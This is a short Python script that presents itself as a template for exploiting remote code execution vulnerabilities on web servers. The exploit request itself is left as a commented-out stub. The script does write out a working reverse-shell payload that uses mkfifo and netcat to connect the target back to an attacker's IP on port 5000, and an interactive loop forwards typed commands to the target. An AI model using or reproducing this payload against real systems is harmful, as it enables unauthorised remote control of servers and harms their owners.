#!/usr/bin/python
#
# Template for exploiting RCE vulnerabilities 

import os
import sys
import socket
import urllib
import requests

def runRCE(URL, cmd):
  print("RCE is go..")

# Pipe stuff to Burp (or some other proxy)
#  proxies = {
#    'http': 'http://127.0.0.1:8510',
#  }

# TODO: actual request (or a series of requests) needed to exploit the RCE
#  r = requests.post(URL, data=sonni, headers={"content-type": "application/json"})
#  print(r.text)


# TODO : choose innocent script names randomly to prevent accidental clashes
# TODO : support other methods of opening the reverse shell
def openReverseShell(URL, IP):
  runRCE(URL, 'echo "rm /tmp/fug1;mkfifo /tmp/fug1;cat /tmp/fug1|/bin/sh -i 2>&1|nc ' + IP + ' 5000 >/tmp/fug1" > plznow.sh')
  runRCE(URL, "chmod u+x plznow.sh")
  runRCE(URL, "./plznow.sh")

# USE LIKE: python attackshell.py http://exploitable.server.somewhere 1.1.1.1
# 1.1.1.1 = your IP for reverse shell, if possible 
URL = sys.argv[1]
print("URL: " + URL)
IP = sys.argv[2]

data = ''

# 1. loop as long  as the commmand is not "exit"
# 2. "rshell" tries to open a reverse shell from the target back to given host IP
# 3. all other commands are sent to the remote server for RCE 
while (data != 'exit'):
  try:
    data = raw_input('>> ')
    if (data != 'exit'):
      runRCE(URL, data)
    if (data == 'rshell'):
      openReverseShell(URL,IP)
  except EOFError:
    break
